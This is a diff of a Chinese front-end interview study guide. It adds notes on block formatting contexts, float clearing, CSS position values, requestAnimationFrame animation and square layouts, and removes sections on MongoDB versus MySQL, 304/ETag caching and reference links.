+块格式化上下文（block formatting context） 是页面上的一个独立的渲染区域，容器里面的子元素不会在布局上影响到外面的元素。它是决定块盒子的布局及浮动元素相互影响的一个因素。
+
+下列情况将创建一个块格式化上下文：
+
+① float
+② overflow
+③ display（display为inline-block、table-cell）
+④ position（absolute 或 fixed）
 
 
 
-#### 说说mongoDB和MySQL的区别
+#### BFC的作用
 
+1.清除内部浮动：对子元素设置浮动后，父元素会发生高度塌陷，也就是父元素的高度变为0。解决这个问题，只需要把把父元素变成一个BFC就行了。常用的办法是给父元素设置overflow:hidden。
 
+2.上下margin重合问题，可以通过触发BFC来解决
 
-`MySQL`是传统的关系型数据库，`MongoDB`则是非关系型数据库
+#### 清除浮动元素的方法和各自的优缺点
 
- `mongodb`以`BSON`结构（二进制）进行存储，对海量数据存储有着很明显的优势。
+清除浮动，实际上是清除父元素的高度塌陷。因为子元素脱离了父元素的文档流，所以，父元素失去了高度，导致了塌陷。要解决这个问题，就是让父元素具有高度。
 
-对比传统关系型数据库,NoSQL有着非常显著的性能和扩展性优势，与关系型数据库相比，MongoDB的优点有：
-①弱一致性（最终一致），更能保证用户的访问速度：
-②文档结构的存储方式，能够更便捷的获取数据。
+浮动元素的特性：
+在正常布局中位于该浮动元素之下的内容，此时会围绕着浮动元素，填满其右侧的空间。浮动到右侧的元素，其他内容将从左侧环绕它（浮动元素影响的不仅是自己，它会影响周围的元素对其进行环绕。float仍会占据其位置，`position:absolute`不占用页面空间 会有重叠问题  ）
 
+1.在浮动元素末尾添加空标签清除浮动 clear:both （缺点：增加无意义标签）
+```
+<div style="clear:both;"></div>
+```
+2.给父元素设置 overflow:auto属性
+3.after伪元素
 
-#### 讲讲304缓存的原理
+#### img属于什么类型的元素？
 
+img 可替换元素，replaced element
 
+#### css position 有哪些取值
 
-服务器首先产生`ETag`，服务器可在稍后使用它来判断页面是否已经被修改。本质上，客户端通过将该记号传回服务器要求服务器验证其（客户端）缓存。
+absolute、fixed、relative
+static、initial、inherit（P5）
+sticky、unset（P6）
 
-<br>
+#### 动画
 
-304是HTTP状态码，服务器用来标识这个文件没修改，不返回内容，浏览器在接收到个状态码后，会使用浏览器已缓存的文件
+用js来实现动画，我们一般是借助setTimeout或setInterval这两个函数，以及新的requestAnimationFrame
 
-<br>
+```javascript
+<div id="demo" style="position:absolute; width:100px; height:100px; background:#ccc; left:0; top:0;"></div>
 
-客户端请求一个页面（A）。 服务器返回页面A，并在给`A`加上一个`ETag`。 客户端展现该页面，并将页面连同`ETag`一起缓存。 客户再次请求页面`A`，并将上次请求时服务器返回的`ETag`一起传递给服务器。 服务器检查该`ETag`，并判断出该页面自上次客户端请求之后还未被修改，直接返回响应`304`（未修改——`Not Modified`）和一个空的响应体。
+<script>
+  var demo = document.getElementById('demo');
+  function rander(){
+    demo.style.left = parseInt(demo.style.left) + 1 + 'px'; //每一帧向右移动1px
+  }
+  requestAnimationFrame(function(){
+    rander();
+    //当超过300px后才停止
+    if(parseInt(demo.style.left)<=300) requestAnimationFrame(arguments.callee);
+  });
+</script>
+```
 
+css3使用
 
+- @keyframes 结合animation
+- transition：property  duration timing-function delay
 
-<br>
+#### css实现自适应正方形
 
-
-
-#### 什么样的前端代码是好的
-
-
-高复用低耦合，这样文件小，好维护，而且好扩展。
-
-
-#### 代码题
-
-- [css代码题](./readme.html)
-- [js代码题](./readme.js)
-
-
-  [16]: /imgs/what-is-html5.jpg
-
-
-  [2]: http://segmentfault.com/blog/trigkit4/1190000000718840
-
-  [3]: http://segmentfault.com/blog/trigkit4/1190000000660786#articleHeader15
-
-  [4]: http://segmentfault.com/blog/trigkit4/1190000000687844
-
-  [5]: http://segmentfault.com/blog/trigkit4/1190000000758184#articleHeader5
-
-  [6]: http://segmentfault.com/blog/trigkit4/1190000000800711#articleHeader30
-
-  [7]: http://segmentfault.com/blog/trigkit4/1190000000656717
-
-  [8]: http://segmentfault.com/blog/trigkit4/1190000000697254
-
-  [9]: http://segmentfault.com/blog/trigkit4/1190000002440502
-
-  [10]: http://segmentfault.com/blog/trigkit4/1190000000691919
-
-  [11]: http://segmentfault.com/blog/trigkit4/1190000002585760
-
-  [12]: http://segmentfault.com/blog/trigkit4/1190000000652891
-
-  [13]: http://segmentfault.com/blog/trigkit4/1190000002174034
-
-  [14]: http://segmentfault.com/blog/trigkit4/1190000000691919
-
-  [15]: http://segmentfault.com/blog/trigkit4/1190000000733959
+方案一：CSS3 vw 单位
+方案二：设置垂直方向的padding撑开容器
+方案三：利用伪元素的 margin(padding)-top 撑开容器
